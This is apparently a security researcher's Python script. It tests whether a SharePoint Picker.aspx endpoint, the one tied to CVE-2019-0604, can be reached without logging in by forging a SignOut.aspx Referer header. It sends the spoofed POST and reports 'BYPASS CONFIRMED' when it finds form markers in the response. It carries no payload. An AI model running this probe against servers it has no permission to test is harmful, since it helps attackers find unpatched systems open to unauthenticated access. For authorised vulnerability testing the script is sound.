#!/usr/bin/env python3
"""
Test if Picker.aspx (CVE-2019-0604 endpoint) is vulnerable to signout bypass
with proper Content-Length header.

This is a CRITICAL test because Picker.aspx was the entry point for
CVE-2019-0604 (unauthenticated deserialization).
"""

import requests
import argparse

def test_picker_with_proper_headers(base_url):
    """Test Picker.aspx with signout Referer and proper headers"""
    print("[*] Testing Picker.aspx with signout bypass + proper HTTP headers")
    print("="*80)

    endpoint = "/_layouts/15/Picker.aspx"
    url = f"{base_url}{endpoint}"

    # Proper headers including Content-Length (will be set automatically by requests)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
        "Referer": "/_layouts/SignOut.aspx",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    # Test with minimal POST data (requests library will set Content-Length automatically)
    data = "test=1"

    print(f"\n[*] Request: POST {endpoint}")
    print(f"    Referer: /_layouts/SignOut.aspx")
    print(f"    Data: {data}")

    try:
        response = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=10)

        print(f"\n[*] Response Status: {response.status_code}")
        print(f"[*] Response Headers:")
        for header, value in response.headers.items():
            print(f"    {header}: {value}")

        print(f"\n[*] Response Body (first 1000 chars):")
        print(response.text[:1000])

        # Analysis
        print("\n[*] Analysis:")
        body_lower = response.text.lower()

        if response.status_code == 200:
            if "411" in response.text or "length required" in body_lower:
                print("    [-] Still getting HTTP 411 error")
                return False
            elif "viewstate" in body_lower or "__viewstate" in body_lower:
                print("    [+] Page contains ViewState - functional page!")
                print("    [!] BYPASS CONFIRMED: Can access Picker.aspx without authentication")
                return True
            elif "form" in body_lower and "input" in body_lower:
                print("    [+] Page contains forms/inputs - functional page!")
                print("    [!] BYPASS CONFIRMED: Can access Picker.aspx without authentication")
                return True
            elif "error" not in body_lower:
                print("    [+] No obvious error messages")
                print("    [?] Page might be functional - needs deeper inspection")
                return True
            else:
                print("    [~] Response contains error indicators")
                print("    [?] Unclear if this is exploitable")
                return False
        elif response.status_code == 401:
            print("    [-] Authentication required - bypass failed")
            return False
        else:
            print(f"    [?] Unexpected status: {response.status_code}")
            return False

    except Exception as e:
        print(f"\n[!] Error: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Test Picker.aspx bypass with proper headers")
    parser.add_argument("--url", required=True, help="Target URL")
    args = parser.parse_args()

    base_url = args.url.rstrip('/')

    result = test_picker_with_proper_headers(base_url)

    print("\n" + "="*80)
    if result:
        print("[!] CRITICAL: Picker.aspx authentication bypass CONFIRMED")
        print("[!] This endpoint was vulnerable to CVE-2019-0604 (deserialization)")
        print("[!] The CVE-2025-49706 patch only fixed ToolPane.aspx, NOT Picker.aspx")
    else:
        print("[+] Picker.aspx bypass test inconclusive or blocked")

if __name__ == "__main__":
    main()
